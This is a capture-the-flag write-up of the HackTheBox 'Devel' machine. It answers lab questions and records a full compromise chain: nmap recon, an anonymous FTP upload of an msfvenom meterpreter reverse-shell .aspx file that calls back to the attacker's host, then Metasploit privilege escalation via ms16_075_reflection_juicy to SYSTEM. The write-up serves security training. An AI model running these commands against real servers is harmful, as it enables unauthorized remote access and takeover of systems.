# Devel

![image.png](image.png)

# Context

Lab link: [https://app.hackthebox.com/machines/Devel](https://app.hackthebox.com/machines/Devel)

Suggested tools: `nmap`, `msfvenom`, `msfconsole`

# Scenario

Devel, while relatively simple, demonstrates the security risks associated with some default program configurations. It is a beginner-level machine which can be completed using publicly available exploits.

# Questions

Q1- What is the name of the service is running on TCP port `21` on the target machine?

Answer: `Microsoft ftpd`

Reason: The nmap service scan identified `Microsoft ftpd` running on port 21, alongside anonymous FTP login enabled and the same webroot files (`iisstart.htm`, `welcome.png`) also served by IIS on port 80 — indicating FTP and the web server share a document root.

```python
# nmap scan
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
```

Q2- Which basic FTP command can be used to upload a single file onto the server?

Answer: `put`

Reason: The FTP client's `put` command uploads a single local file to the connected server, pairing with `get` for downloads; on Devel this is the mechanism for placing a file into the anonymous-writable FTP root shared with the IIS webroot.

Q3- Are files put into the FTP root available via the webserver?

Answer: Yes

Reason: The anonymous FTP directory listing on port 21 shows `iisstart.htm` and `welcome.png`, the same default files served by IIS on port 80 (confirmed via `http-title: IIS7` and the `Microsoft-IIS/7.5` server header) — proving the FTP root and the IIS webroot (`C:\inetpub\wwwroot`) are the same physical directory, so any file uploaded via FTP `put` lands directly in the web-accessible path.

Q4- What file extension is executed as a script on this webserver? Don't include the `.`.

Answer: `aspx`

Reason: IIS 7.5 with the `aspnet_client` directory present in the FTP root confirms [ASP.NET](http://asp.net/) is installed and active, meaning any file uploaded with the `aspx` extension via the shared FTP/web root will be executed server-side as a script rather than served as static content — this is the mechanism for landing a webshell or reverse shell on Devel.

Q5- Which Metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?

Answer: `local_exploit_suggester`

Reason: The `msf > search suggester` output lists `post/multi/recon/local_exploit_suggester` as a matching module, rank `normal`; run against an active session it checks the target's OS and patch level against known local privilege-escalation exploits and reports which ones are likely to work, making it the standard recon step after landing an initial low-privilege shell on Devel.

![image.png](image%201.png)

Q6- User flag: [REDACTED]

Q7- Root flag: [REDACTED]

```python
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.7 LPORT=4444 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 355 bytes
Final size of aspx file: 2874 bytes
Saved as: shell.aspx

$ ftp devel.htb
Connected to devel.htb.
220 Microsoft FTP Service
Name (devel.htb:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put shell.aspx 
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49161|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************|  2914       34.73 MiB/s    --:-- ETA
226 Transfer complete.
2914 bytes sent in 00:00 (23.87 KiB/s)
ftp> 

msf post(multi/recon/local_exploit_suggester) > back
msf > use exploit/multi/handler                                                                                                                 
[*] Using configured payload generic/shell_reverse_tcp                                                                                          
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp                                                                                                      
msf exploit(multi/handler) > set LHOST 10.10.17.7                                                                                               
LHOST => 10.10.17.7                                                                                                                             
msf exploit(multi/handler) > set LPORT 4444                                                                                                     
LPORT => 4444                                                                                                                                   
msf exploit(multi/handler) > run                                                                                                                
[*] Started reverse TCP handler on 10.10.17.7:4444 # Invoke http://devel.htb/shell.aspx                                                                                         
[*] Sending stage (203450 bytes) to 10.129.123.87                                                                                               
[*] Meterpreter session 1 opened (10.10.17.7:4444 -> 10.129.123.87:49162) at 2026-11-05 10:09:06 -0500  # CTRL+Z

msf post(multi/recon/local_exploit_suggester) > sessions 

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.17.7:4444 -> 10.129.123.87:49162 (10.129.123.87)

msf post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1

msf post(multi/recon/local_exploit_suggester) > run
[*] 10.129.123.87 - Collecting local exploits for x86/windows...
[*] 10.129.123.87 - 267 exploit checks are being tried...
[+] 10.129.123.87 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable. Windows 7 appears vulnerable
[+] 10.129.123.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. Version Windows 7 appears vulnerable
[+] 10.129.123.87 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.129.123.87 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. Version Windows 7 detected but not confirmed vulnerable
[+] 10.129.123.87 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated. Target OS Windows 7 (6.1 Build 7600). matches a vulnerable version
[+] 10.129.123.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.123.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.123.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.123.87 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated. Version Windows 7 detected but not confirmed vulnerable
[+] 10.129.123.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.123.87 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. 32-bit target detected
[+] 10.129.123.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. Windows session with multiple CPU cores detected
[+] 10.129.123.87 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. Target appears vulnerable
[+] 10.129.123.87 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable. Version Windows 7 appears vulnerable
[+] 10.129.123.87 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.123.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.123.87 - exploit/windows/persistence/bits: The target is vulnerable. Likely exploitable
[-] 10.129.123.87 - Post interrupted by the console user
[*] Post module execution completed

meterpreter > getuid 
Server username: IIS APPPOOL\Web
meterpreter > getp
getpid    getprivs  getproxy  
meterpreter > getprivs 

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

msf exploit(windows/local/ms16_075_reflection_juicy) > exploit 
[*] Started reverse TCP handler on 10.10.17.7:5555 
[+] Target appears to be vulnerable (Windows 7)
[*] Launching notepad to host the exploit...
[+] Process 1944 launched.
[*] Reflectively injecting the exploit DLL into 1944...
[*] Injecting exploit into 1944...
[*] Exploit injected. Injecting exploit configuration into 1944...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (203450 bytes) to 10.129.123.87
[*] Meterpreter session 3 opened (10.10.17.7:5555 -> 10.129.123.87:49183) at 2026-11-05 10:20:50 -0500

meterpreter > 
Background session 3? [y/N]  
msf exploit(windows/local/ms16_075_reflection_juicy) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL      10.10.17.7:4444 -> 10.129.123.87:49162 (10.129.123.87)
  3         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DEVEL  10.10.17.7:5555 -> 10.129.123.87:49183 (10.129.123.87)

msf exploit(windows/local/ms16_075_reflection_juicy) > sessions 3
[*] Starting interaction with 3...

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

# Attack Chain

| Stage | Detail | MITRE |
| --- | --- | --- |
| Reconnaissance | nmap scan identifies Microsoft ftpd (port 21, anonymous allowed) and Microsoft-IIS/7.5 (port 80) sharing the same file listing | T1595 |
| Initial Access | Anonymous FTP put shell.aspx into shared `C:\inetpub\wwwroot`, executed via HTTP request to hxxp://devel[.]htb/shell.aspx | T1190 |
| Execution | msfvenom windows/meterpreter/reverse_tcp .aspx payload callback caught by exploit/multi/handler on `10.10.17.7`:4444, session 1 opened as `IIS APPPOOL\Web` | T1059 |
| Discovery | post/multi/recon/local_exploit_suggester run against session 1, enumerates viable local privesc candidates for Windows 7 build 7600 | T1082 |
| Privilege Escalation (failed attempt) | exploit/windows/local/ms16_075_reflection run against session 1, new session opened but still `IIS APPPOOL\Web` (no elevation) | T1068 |
| Privilege Escalation | exploit/windows/local/ms16_075_reflection_juicy abuses SeImpersonatePrivilege via NTLM-reflection/token-impersonation (Potato-family technique), session 3 opened as `NT AUTHORITY\SYSTEM` | T1134 |
| Collection | user.txt read from `c:\Users\babis\Desktop`; root.txt read from `c:\Users\Administrator\Desktop` | T1005 |

## Attack Tree

```bash
HTB Devel (devel.htb)
│
├── 21/tcp -- Microsoft ftpd, anonymous login allowed
│   └── put shell.aspx into C:\inetpub\wwwroot (shared with IIS webroot)
│       └── GET http://devel.htb/shell.aspx (ASP.NET executes .aspx)
│           └── shell as IIS APPPOOL\Web
│               │
│               ├── c:\Users\babis\Desktop\user.txt
│               │   └── [USER FLAG]
│               │
│               └── SeImpersonatePrivilege enabled
│                   └── exploit/windows/local/ms16_075_reflection_juicy
│                       └── NT AUTHORITY\SYSTEM
│                           └── c:\Users\Administrator\Desktop\root.txt
│                               └── [ROOT FLAG]
```

# Artifacts

| Category | Type | Value |
| --- | --- | --- |
| Discovery | Target | devel.htb |
|  | FTP service | Microsoft ftpd (port 21, anonymous login) |
|  | Web service | Microsoft-IIS/7.5 (port 80) |
| Delivery | Initial webshell | shell.aspx ([ASP.NET](http://asp.net/) command shell) |
|  | Shared root path | `C:\inetpub\wwwroot` |
| Dropped File | Meterpreter payload | shell.aspx (msfvenom -p windows/meterpreter/reverse_tcp) |
| Discovery | OS build | Windows 7, build 7600, revision 16385 |
| Privilege Escalation | Failed module | exploit/windows/local/ms16_075_reflection |
|  | Successful module | exploit/windows/local/ms16_075_reflection_juicy |
|  | Abused privilege | SeImpersonatePrivilege |
| Flags | User flag | `c:\Users\babis\Desktop\user.txt` — [REDACTED] |
|  | Root flag | `c:\Users\Administrator\Desktop\root.txt` — [REDACTED] |

# Lab Insights

1. Anonymous write access to a file-sharing service is rarely confined to the service itself — its real danger is that FTP, SMB, and other transfer protocols are frequently rooted in the exact same physical directory as a web server, turning a "download-only" misconfiguration into direct remote code execution the moment the web server treats uploaded content as executable. On Devel, anonymous FTP write access into C:\inetpub\wwwroot let an .aspx webshell become live and reachable over HTTP with zero authentication (T1190).
2. Service accounts are rarely as restricted as they appear — Windows grants accounts like IIS APPPOOL\Web a default set of process privileges (including SeImpersonatePrivilege) intended for legitimate COM/token operations, but this same privilege is the foundation of the entire "Potato" family of local privilege escalation techniques. Any low-privileged web service account with SeImpersonatePrivilege enabled should be treated as a near-certain path to SYSTEM on unpatched Windows hosts (T1134).
3. Automated exploit suggestion is not a guarantee of success — local_exploit_suggester correctly flagged over a dozen "vulnerable" candidates, but the first attempted module (ms16_075_reflection) completed without error yet produced zero privilege gain, while a closely related variant (ms16_075_reflection_juicy) succeeded outright. Treating suggester output as a ranked shortlist to iterate through, rather than a single guaranteed answer, is essential methodology (T1068).